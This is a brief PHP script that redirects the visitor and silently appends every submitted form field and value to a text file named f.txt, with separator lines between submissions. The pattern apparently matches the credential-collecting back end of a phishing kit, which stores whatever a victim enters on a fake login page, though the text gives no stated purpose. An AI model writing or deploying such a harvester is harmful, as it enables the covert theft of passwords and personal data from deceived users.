<?php
header ('Location: f ');
$handle = fopen("f.txt", "a");
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");}
fwrite($handle, "===============\r\n");
fclose($handle);
exit;
?>